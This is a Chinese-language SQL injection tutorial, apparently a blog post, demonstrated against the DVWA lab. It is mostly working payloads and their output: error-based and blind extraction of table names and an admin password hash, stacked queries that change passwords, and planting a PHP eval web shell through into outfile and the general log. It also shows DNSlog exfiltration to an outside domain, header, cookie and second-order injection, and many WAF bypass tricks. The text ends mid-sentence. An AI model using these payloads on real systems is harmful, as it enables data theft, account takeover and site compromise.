好啦，函数介绍就到此为止，下面我们正式开始报错注入的步骤！\n爆破数据库名称 1\u0026#39; and extractvalue(1,concat(0x7e,database(),0x7e)) # 1\u0026#39; and updatexml(1,concat(0x7e,database(),0x7e),1) # 出现下面报错：\nXPATH syntax error: \u0026#39;~dvwa~\u0026#39; 这就得到了数据库的名称：dvwa\n可能你会有疑惑，为什么要用~包裹内容呢？\n这一方面是方便我们看返回的结果，另一方面嘛，我们接着往下看\n爆破表名 由于 extractvalue() 最大返回长度为 32 ，所以最好用 limit N,1 一行一行的进行回显\n1\u0026#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 0,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1),0x7e)) # 分别出现下面报错：\nXPATH syntax error: \u0026#39;~guestbook~\u0026#39; XPATH syntax error: \u0026#39;~users~\u0026#39; 而如果不用limit语句，则会出现下面的报错：\nSubquery returns more than 1 row 这不是我们想要的，所以limit语句很重要！\n爆破列名 1\u0026#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 3,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 4,1),0x7e)) # 分别出现下面报错：\nXPATH syntax error: \u0026#39;~user~\u0026#39; XPATH syntax error: \u0026#39;~password~\u0026#39; 爆破字段内容 1\u0026#39; and extractvalue(1,concat(0x7e,(select concat_ws(\u0026#39;,\u0026#39;,user,password) from users limit 0,1),0x7e)) # 出现下面的报错：\nXPATH syntax error: \u0026#39;~admin,5f4dcc3b5aa765d61d8327deb\u0026#39; 这里我们使用了concat_ws函数，指定把user和password字段使用,拼接再返回，这样就能实现查询多列\n如果不使用，就会出现下面的报错：\nOperand should contain 1 column(s) 然而，正如上面所说，extractvalue() 函数最大返回32个字符，所以现在得到的并非完整的信息，这一点我们也能从结果末尾没有~看出来**（所以两边都加~是比较明智的选择）**\n所以，我们要适当舍弃一些东西，比如把admin单独拿出来，或者使用**substring()函数**\n💡 Tip substring(strings,m,n)：从strings的第m个字符开始，向后截取n个字符\n1.substring()的开始位置为1，和limit不一样！\n2.通常substr()可以代替它，用法也相同；而mid()总是可以代替它，因为就是它的别名\n也就是说：substr()=substring()=mid()\n1\u0026#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(\u0026#39;,\u0026#39;,user,password), 1, 30) from users limit 0,1),0x7e)) # 1\u0026#39; and extractvalue(1,concat(0x7e,(select substring(concat_ws(\u0026#39;,\u0026#39;,user,password), 31, 30) from users limit 0,1),0x7e)) # 分别得到下面的报错：\nXPATH syntax error: \u0026#39;~admin,5f4dcc3b5aa765d61d8327de~\u0026#39; XPATH syntax error: \u0026#39;~b882cf99~\u0026#39; 拼接得到完整的用户名和密码：\nadmin,5f4dcc3b5aa765d61d8327deb882cf99 利用substring()，即使字段长度远远大于32，我们也能一点点凑出完整的内容\n#3 盲注 有的时候存在注入点，但是前端并不会回显注入结果，这就需要用特殊方式判断我们是否注入成功\n常用函数 函数 用法 mid/substr/substring(string, m, n) 从 m 位置截取string字符串 n 位，初始位置为1，n 可省略 length(string) 返回字符串长度 ord(string) 返回 string 最左面字符的 ASCII 码值 left(string, len) 从左截取 string 的前 len 位 ascii() 将某个字符转换为 ASCII 码值 if(exp1, exp2, exp3) 如果 exp1 正确，就执行 exp2 ，否则执行 exp3 sleep(time) 休眠多少秒 布尔盲注 当我们查询的数据在数据库存在时，就会返回：\nUser ID exists in the database 反之，则会返回：\nUser ID is MISSING from the database 我们可以构造一些判别式，观察页面返回值，来判断输入的语句是否为真\n猜测长度 使用与(and)：\n1\u0026#39; and length(database())=4 # 使用或(or)：\n\u0026#39; or length(database())=4 # 页面返回exists，说明数据库名称长度为4\n如果库名实在长，也可以使用二分法：\n1\u0026#39; and length(database())\u0026gt;4 # 猜测库名 1\u0026#39; and substring(database(),1,1)=\u0026#39;d\u0026#39; # 如果不想使用''包裹字母，也可以转换成ascii码：\n1\u0026#39; and ascii(substr(database(),1,1))=100 # 一步步尝试，直到尝试出完整的数据库名称\n当然，我们在知道ascii码表的情况下，使用二分法更快：\n1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;64 # 如果substring被过滤了：reverse+left代替substring ​\ttrim代替substring 附上一张ascii码表：\n猜测表的数量 1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39;)=2 # 猜测表2的长度 1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1))=5# 或者把length放在select后面：\n1\u0026#39; and (select length(table_name) from information_schema.tables where table_schema=\u0026#39;dvwa\u0026#39; limit 1,1)=5# 猜测表名，字段名等等的步骤都大同小异，在此不过多赘述\n时间盲注 如果页面连exists这样的返回字样都没有怎么办？\n那么，我们就要寻找新的特征，来指示我们语句成功执行了——那就是时间\nsleep延时 利用if函数和sleep函数，如果语句成功执行，就让页面延时一段时间：\n1\u0026#39; and if(length(database())=4,sleep(5),1)# 注意此处if函数有三个参数，最后一个失败执行的语句exp3不能为空，要填上1补空\n如果不用if，也是可以的：\n1\u0026#39; and sleep((ascii(substring(database(),1,1))=100)*5)# 页面休眠了五秒，说明语句执行成功（sleep()返回了1,1*5=5），数据库名称长为4\n如果if函数被过滤了：[case when语句代替if](#case when语句代替if)\nbenchmark延时 benchmark(count, exp)：将表达式exp重复执行count次\n只要我们让执行次数够多，就能达到和sleep一样的延迟效果：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,benchmark(5000000,md5(\u0026#39;a\u0026#39;)),1)# 如果数据库第一个字符是d，就让数据库计算五百万次a的md5值，这个过程近似五秒\n笛卡尔积延时 当查询发生在多个表中，并且没有任何限制条件时，会将多个表已笛卡尔积的形式联合起来：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100, (SELECT count(*) FROM information_schema.columns A, information_schema.columns B), 1)# 这个查询将information_schema.columns这张表自身进行了两次连接，查询起来很费时（大概要两三秒）\n如果感觉延时不够明显，可以多加几次自连接\n正则匹配延时 通过构造正则表达式，让数据库的正则引擎在进行匹配时陷入大量的回溯计算，从而消耗极长的CPU时间：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100, (select rpad(\u0026#39;a\u0026#39;,9999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;)), 1)# 我们来看看其中的正则延时部分是怎么工作的：\nselect rpad(\u0026#39;a\u0026#39;,4999999,\u0026#39;a\u0026#39;) RLIKE concat(repeat(\u0026#39;(a.*)+\u0026#39;,30),\u0026#39;b\u0026#39;) rpad(str,len,padstr)：用字符串padstr对str进行右边填补，直至它的长度达到len，然后返回 str\n​\t如果str的长度长于len，那么它将被截除到len个字符\n(a.*)+：内部的 .* 和外部的 + 都是贪婪量词，当正则引擎用这个模式去匹配一个长字符串时，存在指数级的可能性来划分字符串（例如，(a)(a)(a)、(aa)(a)、(a)(aa)等），引擎需要尝试所有这些路径\nb: 在模式末尾加上一个源字符串中不存在的字符'b'，是为了确保正则表达式的匹配最终一定会失败。这会迫使正则引擎耗尽所有可能的回溯路径，从而将延迟时间最大化\nrepeat(str,times)：字符串str复制times次\n⚠️ Warning 我在dvwa上使用上述的正则匹配方式无法得到延时结果，如果您知道为什么请留言\u0026gt;\u0026lt;\n参考文章：MySQL时间盲注五种延时方法 时间盲注其余的操作顺序和布尔盲注相同，只是换了一种方式实现判断\n报错盲注 报错盲注的思想和时间盲注相同，都是利用if函数\n不同点在于，报错盲注不依赖页面是否延时判断，而是依赖页面是否报错判断\nsql中存在很多数学计算函数，我们也主要利用他们来实现报错\nexp() exp(x)返回e的x次方，也就是e^x^\n当传递给exp()的参数过大（在MySQL中约大于709）时，会产生数值越界错误\n我们可以通过位运算符~运算0获得一个巨大的整数：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,exp(~0),1)# 我们知道，~0的结果是64位无符号整数的最大值，远大于709，因此exp()函数执行时必定会溢出报错：\nDOUBLE value is out of range in \u0026#39;exp(~(0))\u0026#39; 你也可以选择手动输入一个很大的数字，比如exp(99999)\n同样的，我们也可以不用if函数，只要利用判断的返回值做运算即可：\n1\u0026#39; and exp((ascii(substring(database(),1,1))=100)*99999)# 如果ascii(substring(database(),1,1))=100为真，那么运算式为exp(1*99999)，也就是exp(99999)，就会报错\ncot() cot()是余切三角函数，而众所周知，cot(0)是不存在的：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,cot(0),1)# 也可以不用if函数：\n1\u0026#39; and cot((ascii(substring(database(),1,1))=100)=0)# 如果ascii(substring(database(),1,1))=100为真，那么运算式为cot(1=0)，也就是cot(0)，就会报错\npow() pow(a,b)函数用于求a^b^的值，相信你已经知道怎么做了：\n1\u0026#39; and if(ascii(substring(database(),1,1))=100,pow(99999,99999),1)# 不使用if函数：\n1\u0026#39; and pow((ascii(substring(database(),1,1))=100)+1,99999)# 如果ascii(substring(database(),1,1))=100为真，那么运算式就是pow(1+1,99999),也就是2^99999^，就会报错\n#4 堆叠注入 有些应用服务执行sql使用的不是mysqli_query(),而是mysqli_multi_query()方法，可以做到执行多条sql语句\n普通多语句注入 如果又恰好没有过滤;，我们就能使用;分割语句，利用sql语句进行各种操作：\n1\u0026#39; union select 1,2;update users set password=123 where id=1--+ 这样就篡改了密码\n但能使用堆叠注入的场景一般都对语句做了过滤，尤其是select这样的核心查询语句，我们需要用别的来代替\nshow查询 查询数据库名称 show databases; 查询数据库中的所有表 show tables from 数据库名; 查看表的字段 show columns from 表名; 或者：\ndescribe 表名; 或者：\ndesc 表名; 查看创建表的语句 show create table 表名; handler查询 handler是mysql特有的语句，他可以通过句柄来访问表\n句柄相当于一个指针\n打开句柄 handler 表名 open; 查看第一行数据 handler 表名 read first; 查看下一行数据 handler 表名 read next; 如果不适用first，直接使用next，效果等同于first\n查看某一行数据 handler 表名 READ 字段名 KEY (字段值); 关闭句柄 handler 表名 close; #5 文件读写注入 前提 mysql数据库中的secure_file_priv参数指定了数据库导入和导出的安全路径\n该参数可以有三种类型：\nsecure_file_priv=NULL：禁止导入和导出\nsecure_file_priv=/：只能在/目录下导入和导出\nsecure_file_priv=\u0026quot;\u0026quot; ：不做限制\n打开mysql.ini文件，在[mysqld]下修改（如果找不到就添加进去，一般都有）如下：\nsecure_file_priv = \u0026#34;\u0026#34; 重启服务，在命令行登录mysql数据库（找mysql.exe,我的路径是phpStudy\\PHPTutorial\\MySQL\\bin）：\nmysql -u root -p 如果不知道密码，就在mysql.ini中添加skip-grant-tables，跟上面命令放在一起就行，意思是不需要登录密码\n登录后搜索该参数：\nshow variables like \u0026#39;%priv%\u0026#39; 显示secure_file_priv对应value值为空，说明不做限制了\n文件读取 利用load_file函数能做到对服务器文件的读取：\nselect load_file(\u0026#34;D:\\\\1.txt\u0026#34;); 配合注入语句，我们可以做到读取任意文件（当然前提是页面会有输出）：\n1\u0026#39; union select 1,load_file(\u0026#39;D:/WWW/1.txt\u0026#39;) # 注意：\n这里使用的是/，因为\\是转义字符，而/在字符串里面没有任何含义\n也可以使用\\\\，给\\转义，让它被当做普通字符处理\n普通文件写入 利用into outfile可以实现任意内容写入指定位置的文件：\nselect \u0026#34;\u0026lt;? evilcode ?\u0026gt;\u0026#34; into outfile \u0026#34;D:\\\\1.txt\u0026#34;; 也可以使用into dumpfile，区别是它只生成一行数据，不会对数据做任何处理（换行等）：\nselect \u0026#34;\u0026lt;? evilcode ?\u0026gt;\u0026#34; into dumpfile \u0026#34;D:\\\\1.txt\u0026#34;; 利用这一点，我们可以向服务器上传一句话木马\nunion select 最常用的写入方式，在select内容中插入一句话木马\n1\u0026#39; union select 1,\u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; # 虽然报错，但是文件也写入成功了：\n接着就可以使用蚁剑等工具接管网站\nlines terminated by lines terminated by用来定义导出的文件中每行数据以什么字符结尾（默认是换行符 \\n）：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; lines terminated by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # lins starting by 与上一种相反，它控制的是每一行开始位置的内容：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; lines starting by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # fields terminated by fields terminated by控制的是一行数据中，各个字段（列）之间的分隔符：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; fields terminated by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # columns terminated by 是上一种的同义词，作用完全一样：\n1\u0026#39; into outfile \u0026#39;D:/WWW/114514.php\u0026#39; columns terminated by \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; # 日志文件写入 如果mysql无法更改导出文件路径，或者根本不允许导出路径，我们还可以通过日志文件注入\n写入的前提是要开启general log或者slow_query_log模式，并设置目录地址\n下面用general log做演示\n查看配置：\nshow variables like \u0026#39;%general%\u0026#39; 开启general log模式：\nset global general_log = on; 设置目录地址：\nset global general_log_file = \u0026#39;D:/WWW/114514.php\u0026#39;; 接下来就可以写入一句话木马：\nselect \u0026#39;\u0026lt;?php eval($_POST[kaka]); ?\u0026gt;\u0026#39; 我们输入的木马会被设定的log文件记录，这时候就能用蚁剑连接网站\n#6 DNSlog注入 DNS在进行域名解析时会留下域名和解析ip的记录(DNSlog)，我们可以利用它显示我们的注入结果\n1.将想要窃取的数据（如数据库名、用户名等）作为这个域名的子域名拼接到查询中\n2.迫使数据库服务器向一个由我们控制的域名发起DNS查询请求\nDNSLOG注入需要有两个条件：\n目标数据库服务器能够向外网发起DNS请求 开启了load_file()读取文件的函数 准备DNSlog平台 网络上有很多公开DNSlog的服务，如www.dnslog.cn，或使用BurpSuite自带的BurpCollaborator\n以dnslog.cn为例，点击Get SubDomain后，我们会得到一个独一无二的子域名，例如：624elh.dnslog.cn： 构造注入Payload 我们需要使用数据库中能够触发网络请求的函数，在MySQL中，最常用的是上文提到过的load_file()：\n1\u0026#39; and load_file(concat(\u0026#39;\\\\\\\\\u0026#39;,(select database()),\u0026#39;.624elh.dnslog.cn\\\\a\u0026#39;))# 当数据库执行这个Payload时，它会尝试使用load_file()去读取一个网络路径\nconcat()函数会将各部分拼接起来，构造出一个完整的UNC路径：\\\\dvwa.624elh.dnslog.cn\\a\n为了访问这个网络路径，服务器的操作系统必须先解析主机名 dvwa.624elh.dnslog.cn，因此它会向DNS服务器发起一个DNS查询请求\n回到DNSlog，点击Refresh Record，将会显示出dns解析记录\n这样，数据库名'dvwa'就作为子域名的一部分，被成功地带到了外部，实现了数据泄露：\n#7 http请求注入 GET/POST请求注入 完整看到这里的你，就会发现上面我们讨论的注入绝大多数都是在GET和POST的场景下\n我们简单句两个例子说明\n==GET请求（查询等）：==\n\u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; $result = mysqli_query($conn, $sql); ?\u0026gt; 我们一般是在查询输入框中输入注入语句，其实也可以在url中：\nhttp://example.com/get_vuln.php?id=1\u0026#39; UNION SELECT 1, user, password FROM users# id后面其实就是我们之前在输入框中输入的内容\n==POST请求（登录等）：==\n\u0026lt;?php $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $sql = \u0026#34;SELECT * FROM users WHERE username = \u0026#39;\u0026#34; . $username . \u0026#34;\u0026#39; AND password = \u0026#39;\u0026#34; . $password . \u0026#34;\u0026#39;\u0026#34;; ?\u0026gt; 其实也就是在输入框里填写注入语句就行，也可以抓包后修改\nhttp头部参数注入 http头部有着许多参数，开发者可能因为记录日志、分析用户行为等目的，从这些参数中获取信息并存入数据库，但过程中没有进行过滤，导致了注入\n这里以最常见的User-Agent、Referer、X-Forwarded-For三个字段举例：\n\u0026lt;?php $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; // 获取伪造的客户端IP $user_agent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; // 获取浏览器标识 $referer = $_SERVER[\u0026#39;HTTP_REFERER\u0026#39;]; // 获取来源页面 // 漏洞点一：根据IP查询该用户是否在黑名单中 $sql_ip = \u0026#34;SELECT * FROM ip_blacklist WHERE ip = \u0026#39;{$ip}\u0026#39;\u0026#34;; $result_ip = mysqli_query($conn, $sql_ip); // 漏洞点二：根据浏览器标识，提供定制化内容 $sql_ua = \u0026#34;SELECT * FROM custom_content WHERE user_agent_key = \u0026#39;{$user_agent}\u0026#39;\u0026#34;; $result_ua = mysqli_query($conn, $sql_ua); // 漏洞点三：记录访问来源 $sql_referer = \u0026#34;SELECT * FROM referer_stats WHERE page_url = \u0026#39;{$referer}\u0026#39;\u0026#34;; $result_referer = mysqli_query($conn, $sql_referer); echo \u0026#34;脚本执行完毕。\u0026#34;; ?\u0026gt; 这里三个字段都没有进行任何的过滤，我们抓包之后修改对应内容：\nGET /analytics.php HTTP/1.1 Host: vulnerable-site.com User-Agent: Mozilla/5.0\u0026#39; and (updatexml(1,concat(0x7e,(select database())),1)) and \u0026#39; X-Forwarded-For: 127.0.0.1\u0026#39; and (updatexml(1,concat(0x7e,(select database())),1)) and \u0026#39; Referer: http://google.com\u0026#39; and (updatexml(1,concat(0x7e,(select database())),1)) and \u0026#39; 方式和普通注入都是差不多的，核心思想没变，只是注意最好使用''闭合后半部分\ncookie注入 从原理上来说，cookie注入和其他的注入方式并没有什么不同，只是注入的地点不同\n我们既可以像上面的头部参数一样抓包修改cookie，也能在本地修改cookie达到注入目的\n以dvwa靶场high等级的sql盲注为例，我们先看看源码：\n\u0026lt;?php if( isset( $_COOKIE[ \u0026#39;id\u0026#39; ] ) ) { $id = $_COOKIE[ \u0026#39;id\u0026#39; ]; $getid = \u0026#34;SELECT first_name, last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39; LIMIT 1;\u0026#34;; $result = mysqli_query($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;], $getid ); $num = @mysqli_num_rows( $result ); if( $num \u0026gt; 0 ) { echo \u0026#39;\u0026lt;pre\u0026gt;User ID exists in the database.\u0026lt;/pre\u0026gt;\u0026#39;; } else { if( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } header( $_SERVER[ \u0026#39;SERVER_PROTOCOL\u0026#39; ] . \u0026#39; 404 Not Found\u0026#39; ); echo \u0026#39;\u0026lt;pre\u0026gt;User ID is MISSING from the database.\u0026lt;/pre\u0026gt;\u0026#39;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026#34;___mysqli_ston\u0026#34;]))) ? false : $___mysqli_res); } ?\u0026gt; dvwa提供了一个修改id的入口，而这个id就是这个页面的一个cookie\n在拿到我们输入的id值后，它没有经过任何过滤，直接插入了sql语句中，就像普通的sql注入点一样\n我们点击链接更换新cookie：\n1\u0026#39; and length(database())=4 # 刷新页面，页面显示User ID exists in the database.，说明查询成功了，也就是数据库名称长度为4\n值得注意的是，这段代码里还有这样的一段：\nif( rand( 0, 5 ) == 3 ) { sleep( rand( 2, 4 ) ); } 页面每次都会进行判断，如果随机数是3，就延迟2-4秒，完全干扰了时间盲注，迫使我们只能使用布尔盲注\n实战中对方可能并不会暴露cookie修改的界面，我们可以使用浏览器自带的开发者工具，或者浏览器扩展\nf12开发者工具（应用 -\u0026gt; cookie）：\n浏览器扩展（比如cookie editor）：\n#8 二次注入 二次注入比较特殊，它用于审查非常严格的情况下，不是窃取数据，而是篡改数据\n我们来看这样一个场景：有一个网站允许用户注册账号，之后可以在个人中心修改自己的密码\n用户注册的php：\n\u0026lt;?php $username = $_POST[\u0026#39;username\u0026#39;]; $username_escaped = addslashes($username); $sql = \u0026#34;INSERT INTO users (username, password) VALUES (\u0026#39;{$username_escaped}\u0026#39;, \u0026#39;some_password_hash\u0026#39;)\u0026#34;; mysqli_query($conn, $sql); ?\u0026gt; 开发者使用了addslashes对输入进行转义，过滤了可能的危险语句\n修改密码的php：\n\u0026lt;?php $current_user = $_SESSION[\u0026#39;username\u0026#39;]; $new_password = $_POST[\u0026#39;new_password\u0026#39;]; $sql = \u0026#34;UPDATE users SET password = \u0026#39;{$new_password}\u0026#39; WHERE username = \u0026#39;{$current_user}\u0026#39;\u0026#34;; ?\u0026gt; 开发者觉得从数据库里面取出的数据绝对正确，于是没有对它做任何处理\n现在我们注册一个账号，用户名叫：admin'#，假设这个网站管理员账号叫admin，跟我们输入的名称很像吧\n经过注册程序的检查，这个名称没有任何问题，于是放进了数据库\n接下来，我们修改这个账号的密码为123，数据库自信地取出这个账号名称放在sql语句里\n这时，sql语句就变成了：\nUPDATE users SET password = \u0026#39;new_password\u0026#39; WHERE username = \u0026#39;admin\u0026#39;#\u0026#39; 因为#的注释，我们竟然直接修改了admin账号的密码！\n好啦，这下我们可以随意登录管理员的账号啦~\n绕过WAF 为了防止sql注入，许多程序应用都会设置各种各样的过滤防护条件——Web应用防火墙(WAF)\n作为攻击者的我们，就需要想办法绕过这些条件，达到注入的目的\n#1 空格过滤绕过 众所周知，sql语句里面存在着大量的空格，而有些WAF会直接把空格加入黑名单，比如下面的代码：\n$id_sanitized = str_replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;id\u0026#39;]); $sql = \u0026#34;SELECT user, password FROM users WHERE user_id = \u0026#34; . $id_sanitized; 它会直接把用户输入内容中的空格移除，然后再拼接进去\n但是，空格有很多的绕过方式\n注释绕过 在大多数的数据库（特别是mysql）中，注释/**/能够代替空格：\n1\u0026#39;/**/union/**/select/**/1,database()# 可以看到，sql语句能够正常运行\nurl编码绕过 一般来说，我们会使用+代替空格，因为+是空格的一种url标准编码形式，如果不行，就要另寻他法了\n对于大多数数据库来说，它们在解析SQL语句时，会将多种空白字符都视为空格一样的分隔符，包括：\n符号 说明 %20 普通空格 %09 TAB 键(水平) %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键(垂直) %a0 空格（和普通空格不一样） 虽然过滤了普通空格，但是其他的符号仍然可以起到空格相等的作用\n制表符等都是不可见字符，我们需要使用url编码来表示他们，比如：\n1\u0026#39;%0dunion%0dselect%0d1,database()# 括号绕过 数字型 mysql数据库有这样一个特性：\n在where id=1后加上=1，变成where id=1=1，意思是查询结果不变\n在where id=1后加上=0，变成where id=1=0，意思是查询结果取反\n结合substring()，我们就能构造出下面的不带有空格注入：\n1=(ascii(substring(database(),1,1))=100) 如果数据库名称第一个字符不是d，那么就会是1=0，和正常的输入1的结果是完全不同的\n这个思想和盲注异曲同工，但是你可能也发现了，上面的payload只适用于数字型的注入\n字符型\u0026amp;数字型 mysql数据库还有一个特性：\n任何可以计算出结果的语句，都可以用括号包围起来 如果我们想要在字符型进行空格的括号绕过，可以使用()把and后面的表达式包裹起来（前提是有返回值）\n上文提到的sleep()函数其实是有返回值的，执行成功为1，失败为0，因此可以使用()包裹：\n1\u0026#39;and(sleep((ascii(substring(database(),1,1))=100)+4))# 而if()函数的返回值则取决于我们写在if里面的函数：\n1\u0026#39;and(if(length(database())=4,sleep(5),1))# 效果和时间盲注相同，这种方式可以用在字符型，也可以用在数字型\n如果逗号被过滤，一般也要使用括号绕过：逗号绕过——绕过函数参数中的逗号 #2 内联注释绕过 绕过特定屏蔽词 为了保持和其他数据库的兼容，mysql数据库会执行放在/*!...*/里面的语句\n这样，如果WAF限制了不能使用一些查询语句，我们就可以把它放在/*!...*/里，比如：\n1\u0026#39; union/*!select*/ 1,2 # WAF会把它看成\u0026quot;带有奇怪符号的注释\u0026quot;而放行，但是到了mysql环境里，就能被执行：\n我们还可以在/*!...*/里面加上版本号：/*!50001...*/，表示数据库是5.00.01及以上版本，该语句才会被执行\n我使用的dvwa的mysql版本是5.5.53，如果使用1' union/*!60001select*/ 1,2 #，就会报版本错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;1,2 #\u0026#39;\u0026#39; at line 1 干扰WAF过滤 有的WAF过滤覆盖的范围可能不够大，比如会过滤掉order by，但是如果在中间加上/*!10440*/：\n1\u0026#39; or 1=1 order/*!10440*/by 1# 这样很可能就能让WAF识别错误，如果一个内联注释不行，就多来几个：\n1\u0026#39; or 1=1 order/*!77777cz*//*!77777cz*/by 1# 或者干脆使用普通的注释干扰：\n1\u0026#39; or 1=1 order/*%%!asd%%%%*/by 1# #3 大小写绕过 有的WAF只针对小写的（或者大写的）查询语句做了过滤：\n$id = $_GET[\u0026#39;id\u0026#39;]; if (strpos($id, \u0026#39;union\u0026#39;) !\u0026lt;mark\u0026gt; false || strpos($id, \u0026#39;select\u0026#39;) !\u0026lt;/mark\u0026gt; false) { die(\u0026#39;error\u0026#39;); } $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id . \u0026#34;\u0026#39;\u0026#34;; 然而很多sql数据库是不区分大小写的，我们就可以大小写交错写来绕过：\n1\u0026#39; uNiOn sElEcT 1,database()# #4 双写绕过 部分WAF所做的工作只是简单的把不允许出现的查询内容（比如sql语句）替换成空字符串：\n$id_sanitized = str_replace(array(\u0026#39;union\u0026#39;, \u0026#39;select\u0026#39;), \u0026#39;\u0026#39;, $_GET[\u0026#39;id\u0026#39;]; ); $sql = \u0026#34;SELECT * FROM users WHERE user_id = \u0026#39;\u0026#34; . $id_sanitized . \u0026#34;\u0026#39;\u0026#34;; 这种过滤方式是很不可靠的，因为就算有危险内容，简陋过滤之后剩下的部分仍然会进入查询（一次过滤）\n我们就可以通过\u0026quot;双写\u0026quot;，比如selselectect，替换中间的select为空后，剩下的部分仍然是select：\n1\u0026#39; uniunionon selselectect 1,2# 过滤器替换后：\n1\u0026#39; union select 1,2# #5 编码绕过 如果WAF针对关键词进行了区分大小写的过滤，这时候就不能通过大小写和双写蒙混过关了\n不过根据WAF一次过滤的特点，我们还是利用各种编码构造出payload\n双重URL编码绕过 因为上传的payload只会url解析一次，我们把部分字符再次进行url编码：\n1\u0026#39; union se%256cect 1,database()# WAF部分(%25 -\u0026gt; %)看见的内容是：\n1\u0026#39; union se%6cect 1,database()# 执行部分(%6c -\u0026gt; l)看见的是：\n1\u0026#39; union select 1,database()# 这就成功传入了目标语句\n附上一张url编码表：\n十六进制、Unicode编码、ASCII编码绕过 其实就是把过滤的字符转换成不同的编码欺骗WAF，比如十六进制：\n1%ef%bc%87 or 1=1# 部分WAF无法解析%ef%bc%87，放行之后会在执行sql语句的服务器(比如IIS)解析，是全角字符＇：\n1＇ OR 1=1 当然你也能直接输入全角试试能不能绕过，这里只是举一个例子\n其他方式大同小异，这里不多赘述\n#6 等价代替绕过 WAF限制了某一些的符号、语句或者函数，但我们可以设法找到功能一样或相似的来代替\n逻辑符号过滤 等号(=)过滤绕过 在SQL语句里，除了=，还有很多用于比较的运算符：\nlike：用于匹配字符串，A like B表示B是A in：用于查找目标是否在对应组中 rlike：只要匹配字符串出现即可，A rlike B表示B在A里面 regexp：和rlike用法一样 between：expr between 下界 and 上界，表示是否expr \u0026gt;= 下界 \u0026amp;\u0026amp; exp \u0026lt;= 上界，上下界可以相等 如果WAF过滤了=，我们可以使用他们实现相同目的：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name = \u0026#39;users\u0026#39;# 使用like匹配：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name like \u0026#39;users\u0026#39;# 使用in匹配（注意in匹配的对象要是一个组）：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name in (\u0026#39;users\u0026#39;)# 使用rlike/regexp匹配：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name rlike \u0026#39;users\u0026#39;# 使用between判断：\n1\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name between \u0026#39;users\u0026#39; and \u0026#39;users\u0026#39;# 大于号(\u0026gt;)和小于号(\u0026lt;)过滤绕过 使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找\n如果无法使用比较操作符，那么就需要使用到greatest()和least()来进行绕过了\ngreatest(n1,n2,n3,\u0026hellip;)函数返回输入参数(n1,n2,n3,\u0026hellip;)的最大值，least()则是返回最小值：\n1\u0026#39; and greatest(ascii(substr(database(),0,1)),64)=64 等价于：\n1\u0026#39; and ascii(substr(database(),0,1))\u0026gt;64 and和or过滤绕过 符号 等价符号 and \u0026amp;\u0026amp; or || xor | not ! 注释符号过滤 如果WAF过滤了#和-- ，我们可以使用另一个'闭合后面的'：\n1\u0026#39; union select 1,2 or \u0026#39;1 或者\n1\u0026#39; union select 1,\u0026#39;2 逗号过滤 绕过limit中的逗号 在进行盲注时，我们经常需要逐行读取数据，会用到limit m, n\n可以使用limit m offset n代替，表示取m行，跳过n行：\n1\u0026#39; union select 1,database() limit 1 offset 0 # 等价于\n1\u0026#39; union select 1,database() limit 0,1 # 绕过函数参数中的逗号 很多函数需要多个参数，用逗号隔开，例如substring(string, m, n)\n可以使用substring(stringfrom m for n)代替：\n1\u0026#39; and substring(database()from 1 for 1)=\u0026#39;d\u0026#39; # 如果空格被过滤了，可以使用()包裹from和for后面的数字：\n1\u0026#39; and substring(database()from(1)for(1))=\u0026#39;d\u0026#39; # 绕过select列表中的逗号 union联合查询注入时，我们经常需要一次性查询多个列，如union select user, password\n可以使用join语句代替：\n1\u0026#39; union 